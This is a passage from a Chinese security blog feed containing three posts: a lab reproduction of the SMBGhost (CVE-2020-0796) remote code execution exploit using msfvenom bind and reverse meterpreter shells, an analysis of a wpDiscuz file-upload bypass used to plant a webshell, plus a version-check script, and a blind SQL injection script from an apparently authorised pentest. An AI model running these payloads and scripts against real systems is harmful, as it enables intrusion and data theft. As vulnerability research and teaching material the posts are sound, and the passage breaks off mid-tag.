        <content type="html"><![CDATA[<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><ol><li>环境<ul><li>被攻击点：Microsoft Windows 10（1903）- 192.168.0.26</li><li>攻击机：kali - 192.168.0.23</li></ul></li><li>工具<ul><li>SMBGhost_RCE_PoC （<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC%EF%BC%89">https://github.com/chompie1337/SMBGhost_RCE_PoC）</a></li><li>Metasploit （kali）</li></ul></li></ol><h3 id="0x02-扫描确认漏洞是否存在"><a href="#0x02-扫描确认漏洞是否存在" class="headerlink" title="0x02 扫描确认漏洞是否存在"></a>0x02 扫描确认漏洞是否存在</h3><p>​        直接使用奇安信的扫描工具，扫描目标系统是否存在漏洞。</p><p>下载链接：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a> </p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F.jpg" alt="扫描目标系统"></p><h3 id="0x03-生成payload并攻击"><a href="#0x03-生成payload并攻击" class="headerlink" title="0x03 生成payload并攻击"></a>0x03 生成payload并攻击</h3><ol><li><p>msf正向连接Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=81 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5payload.jpg" alt="生成payload1"></p><p>​        b. 复制buf，修改SMBGhost_RCE_PoC中USER_PAYLOAD变量为payload</p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%9B%BF%E6%8D%A2exploit.py.jpg" alt="修改exp"></p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">81</span></span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.26</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91getshell.jpg" alt="正向getshell"></p><ol start="2"><li><p>msf反向反弹Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.23 LPORT=80 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5payload.png" alt="生成payload1"></p><p>​        b. 修改SMBGhost_RCE_PoC中USER_PAYLOAD变量</p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">80</span></span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.23</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91getshell.jpg" alt="反向getshell"></p><h3 id="0x04-小坑和总结"><a href="#0x04-小坑和总结" class="headerlink" title="0x04 小坑和总结"></a>0x04 小坑和总结</h3><ol><li>可以根据实际情况生成payload，即实际网络环境来决定正向还是反向，大多数内网环境由于NAT转换和边界防火墙导致不能直接访问内网的服务，还是建议用反向的将目标权限反弹出来。</li><li>测试的时候目标机器在另一台物理机，本来想远程上去，一起截图证明一下，后台发现，远程的时候，发送反向的payload会导致蓝屏，具体原因没分析。</li><li>测试了Cobalt Strike生成的payload，一打就蓝屏，原因不知道，但是还是希望能用cs搞，cs还是好用些。</li></ol>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress评论插件wpDiscuz任意文件上传漏洞分析</title>
      <link href="/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​&nbsp;&nbsp;在t00ls上看到某wordpress站点被上传webshell，下载了access日志分析了一下，判断攻击路径：访问了某页面后 -&gt; 访问了/wp-admin/admin-ajax.php?action=wmuUploadFiles接口 -&gt; 访问webshell，因此确定是这个模块有问题；官网显示V7.0.5修复了一次安全漏洞，于是下载V7.0.3版本学习一下（7.0.4没找到）。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" alt="1"></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>php 5.6.40</li><li>mysql 5.7.26</li><li>Phpstorm</li><li>Wordpress 5.4.1 + wpdiscuz V 7.0.3</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li>环境搭建后，手动安装wpdiscuz插件后，看到文章下增加评论模块</li></ol><img src="/img/wordpress评论插件wpDiscuz任意文件上传漏洞分析/2.png" alt="16" style="zoom: 33%;" /><ol start="2"><li>phpstorm导入web目录，点击图片按钮，上传一个php文件测试一下，上传路径是<a href="http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php%EF%BC%8C%E9%BB%98%E8%AE%A4%E6%98%AF%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E7%9A%84%E3%80%82">http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php，默认是上传不了的。</a></li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" alt="3"></p><ol start="3"><li>从入口点分析，如图是wp_filter的action过滤</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" alt="4"></p><ol start="4"><li>跟进去，可以看到上传的功能点，再进去</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="5"></p><ol start="5"><li>可以看到如图位置，使用getMimeType方法根据文件内容获取文件类型，并不是通过文件后缀名判断，进一步根据$mineType判断是否是允许的上传类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" alt="6"></p><ol start="6"><li>跟入查看isAllowedFileType方法，在判斷$mineType是否在$this -&gt; options -&gt; content[“wmuMimeTypes”]中存在。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" alt="7"></p><ol start="7"><li>如图，进入$options中，可以content[“wmuMimeTypes”]使用三目运算判断，搜索上下文得知，结果就是$defaultOptions[self::TAB_CONTENT][“wmuMimeTypes”]</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" alt="8"></p><ol start="8"><li>进入$defaultOptions中可以得到最终$this -&gt; options -&gt; content[“wmuMimeTypes”]的值是几种常见的图片类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" alt="9"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt="10"></p><ol start="9"><li>很明显此时文件类型已经通过getMimeType()方法修改为text/plain了，但是回到进入isAllowedFileType的代码，发现程序只在此处对上传文件进行了判断后，直接保存了文件。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt="11"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>如此，程序只是根据文件内容判断文件类型，并未对文件后缀进行效验，构造一个图片马，或者手动在webshell前面加上图片头信息即可绕过。</p><ol><li>把后门文件追加到图片后</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="12"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt="13"></p><ol start="2"><li>上传并修改后缀名为php，可以看到返回路径</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt="14"></p><ol start="3"><li>连接webshell</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" alt="15"></p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>​        在装上wpdiscuz插件后，每个文章中都会带有如下标签信息，且带有版本号，可利用此特征编写脚本。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png" alt="16"></p><h3 id="check-version-demo"><a href="#check-version-demo" class="headerlink" title="check version demo"></a>check version demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wpdiscuz</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.s.headrs = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>:</span><br><span class="line">            <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.nonce = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.state = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        res = self.s.get(url=url)</span><br><span class="line"></span><br><span class="line">        pat1 = <span class="string">&quot;wpdiscuz/themes/default/style\.css\?ver=(.*?)&#x27;&quot;</span></span><br><span class="line">        reSearch1 = re.search(pat1, res.text)</span><br><span class="line">        <span class="keyword">if</span> reSearch1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mess = reSearch1.group(<span class="number">0</span>)</span><br><span class="line">        version = reSearch1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 判断版本</span></span><br><span class="line">        vers = version.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(vers) == <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">0</span>]) == <span class="number">7</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">2</span>]) &lt;= <span class="number">4</span>:</span><br><span class="line">                    <span class="built_in">print</span>(url + <span class="string">&quot; 存在任意文件上传漏洞 wpdiscuz版本为 %s&quot;</span> % version)</span><br><span class="line">                    self.state = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># nonce</span></span><br><span class="line">            pat2 = <span class="string">&#x27;&quot;wmuSecurity&quot;:&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">            reSearch2 = re.search(pat2, res.text)</span><br><span class="line">            nonce = reSearch2.group(<span class="number">1</span>)</span><br><span class="line">            self.nonce = nonce</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url)    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self, url, project, filepath</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    wpdiscuz = wpdiscuz()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;检测漏洞结果:&quot;</span>)</span><br><span class="line">    wpdiscuz.check(url)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码分析 </tag>
            
            <tag> 漏洞预警 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次sm4前端参数加密下的sql盲注</title>
      <link href="/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"/>
      <url>/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><hr><p>&emsp;&emsp;在一次授权渗透测试中，应用在前端使用sql语句拼接方式传送参数，很明显存在sql注入，提交漏洞后，用户大概不想重构项目，于是将前端参数传输前均进行加密，但是通过JS找到加密密钥后，结合py脚本还是注入了；后续用户再次升级将设计加密的JS也加密混淆了，不过还有办法找到密钥，借此分享，过程中踩坑绕弯，欢迎大表哥们交流指导。</p><h3 id="0x01-第一次常规测试"><a href="#0x01-第一次常规测试" class="headerlink" title="0x01 第一次常规测试"></a>0x01 第一次常规测试</h3><ol><li><p>如下图点击功能抓数据包，可以发现参数中明显有SQL语句，后使用1=1 和 1=2 确定了注入点，但是没有返回值，只能盲注了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/00-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95.png" alt="00-第一次常规测试"></p></li><li><p>py写个脚本，简单爆破了一下数据库长度、数据库名等信息<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%84%9A%E6%9C%AC%E7%9B%B2%E6%B3%A8.png" alt="01-第一次脚本盲注"></p></li></ol><h3 id="0x02-第二次参数使用SM4加密"><a href="#0x02-第二次参数使用SM4加密" class="headerlink" title="0x02 第二次参数使用SM4加密"></a>0x02 第二次参数使用SM4加密</h3><ol><li><p>接到复测通知，看了下系统，发现参数被加密了，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86.png" alt="02-第二次参数加密"></p></li><li><p>这里找加密方法的图没截，大概就是找到对应的ajax方法，可以看到md5_bean参数的生成通过base.js的encryptData_ECB方法生成，打开base.js清晰可见sm4字样以及secretkey和iv，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/03-%E6%89%BE%E5%88%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95.png" alt="03-找到加密算法"></p></li><li><p>接下来是如何注入，本来想构造一个sqlmap的tamper脚本，但是发现这个是把所有参数一起加密了，没得思路了，于是还是用py写盲注脚本吧，但是网上找的python实现sm4加密的结果都不一样，考虑到这个后台是java的，肯定是java做的解密，于是找了java的sm4实现，试了一下，结果可以了，于是尝试用py调用打包好的jar包进行注入（这里绕了一个大圈，实际上使用py调用js就行，第三次测试的时候更新了）</p></li></ol><p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/04-javasm4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.png" alt="04-javasm4加密解密"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> json</span><br><span class="line">   <span class="keyword">import</span> os</span><br><span class="line">   <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">   </span><br><span class="line">   header = &#123;</span><br><span class="line">       <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">   pay = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._!@#$%^&amp;*()&#x27;</span></span><br><span class="line">   </span><br><span class="line">   proxies = &#123;</span><br><span class="line">       <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">#request构造请求，传入data中的_searchWhere</span></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">payload</span>):</span></span><br><span class="line">       url = <span class="string">&quot;http://&quot;</span></span><br><span class="line">       data = <span class="string">&quot;&#123;\&quot;_searchWhere\&quot;:\&quot; %s\&quot;,\&quot;title\&quot;:\&quot;\&quot;,\&quot;paramsFlag\&quot;:\&quot;false\&quot;,\&quot;parVar\&quot;:\&quot;\&quot;,\&quot;frameId\&quot;:\&quot;=\&quot;,\&quot;readOnly\&quot;:\&quot;\&quot;,\&quot;extWhere\&quot;:\&quot;\,\&quot;type\&quot;:\&quot;\&quot;,\&quot;parWhere\&quot;:\&quot;\&quot;,\&quot;dataFlag\&quot;:\&quot;\&quot;&#125;&quot;</span> % payload</span><br><span class="line">       data = quote(data,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">       command = <span class="string">&quot;java -Dmoudle=e -Dstr=%s -jar sm4Decode.jar&quot;</span> % data</span><br><span class="line">       data_sm4 = <span class="string">&quot;&quot;</span>.join(os.popen(command).readlines())</span><br><span class="line">       data_send = &#123;<span class="string">&quot;md5_bean&quot;</span>:data_sm4&#125;</span><br><span class="line">       cookies = &#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">       result = requests.post(url=url, data=data_send, cookies=cookies, headers=header ,proxies=proxies)</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">len</span>(result.text)</span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">       <span class="comment"># 判断数据库</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">           payload = <span class="string">&quot;and (select length(name) from v$database)=%s&quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">           <span class="built_in">print</span>(payload)</span><br><span class="line">           lenstr = attack(payload)</span><br><span class="line">           <span class="keyword">if</span> lenstr &gt; <span class="number">3000</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&quot;数据库长度是%s&quot;</span>% <span class="built_in">str</span>(i))</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br></pre></td></tr></table></figure><p>4.此时客户疑问，这个sql注入1=1 1=2返回结果是不同、暴露一个数据库版本等信息又有什么用，于是多注了一点信息，证明危害，获取用户表名的过程比较啰嗦，这里只有是结果图。<br>a. 用户表数据<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/05-%E7%9B%B2%E6%B3%A8%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E8%A1%A8.png" alt="05-盲注获取用户表"></p><p>b. owner表数量</p><img src="/img/一次sm4前端参数加密下的sql盲注/06-盲注获取owner表数量.png" alt="06-盲注获取owner表数量" style="zoom:33%;" /><h3 id="0x03-第三次JS加密混淆隐藏密钥"><a href="#0x03-第三次JS加密混淆隐藏密钥" class="headerlink" title="0x03 第三次JS加密混淆隐藏密钥"></a>0x03 第三次JS加密混淆隐藏密钥</h3><ol><li><p>最后一次复测，用户表示已经没问题了，让再看一下，由于时间有点长，重新找一下加密算法位置</p><p>使用抓包抓到的URL，在chrome调试工具中search一下位置，打下断点，点击功能看一下是否触发断点。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/07-%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8A%93%E5%8C%85.png" alt="07-第三次抓包"><br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/08-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0url%E8%AF%B7%E6%B1%82%E4%BD%8D%E7%BD%AE.png" alt="08-调试找到url请求位置"></p></li><li><p>接下来一步一步跟下去，找到参数构造md5_bean参数的位置<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/09-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0.png" alt="09-调试找到参数构造"></p></li><li><p>next找到base64.js，发现代码已经压缩而且加密了。。<br><img 